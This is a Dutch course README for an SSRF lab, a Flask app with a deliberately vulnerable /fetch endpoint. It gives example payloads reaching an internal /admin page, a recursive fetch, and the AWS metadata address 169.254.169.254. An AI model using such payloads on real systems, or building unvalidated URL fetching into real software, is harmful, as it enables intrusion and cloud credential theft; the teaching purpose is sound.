
# Week 03 – SSRF Demo

Deze oefening demonstreert een **Server-Side Request Forgery (SSRF)**-kwetsbaarheid.
De Flask-applicatie heeft twee endpoints:

- `/fetch?url=<url>` – haalt de opgegeven URL op via de server (kwetsbaar endpoint)
- `/admin` – stelt een interne beheerpagina voor die normaal niet extern bereikbaar hoort te zijn

Door SSRF kan een aanvaller de server verzoeken laten doen naar interne adressen,
zoals `127.0.0.1` of cloud-metadata endpoints (`169.254.169.254`).

---

## Starten

```bash
docker compose -f docker-compose-ssrf.yml up --build -d
```

## Voorbeelden

Normale aanvraag:
```
http://localhost:5000/fetch?url=http://zuyd.nl
```

SSRF naar interne admin-pagina:
```
http://localhost:5000/fetch?url=http://127.0.0.1:5000/admin
```

SSRF recursief:
```bash
curl "http://localhost:5000/fetch?url=http://127.0.0.1:5000/fetch?url=http://example.com"
```

SSRF naar cloud-metadata (AWS):
```bash
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/"
```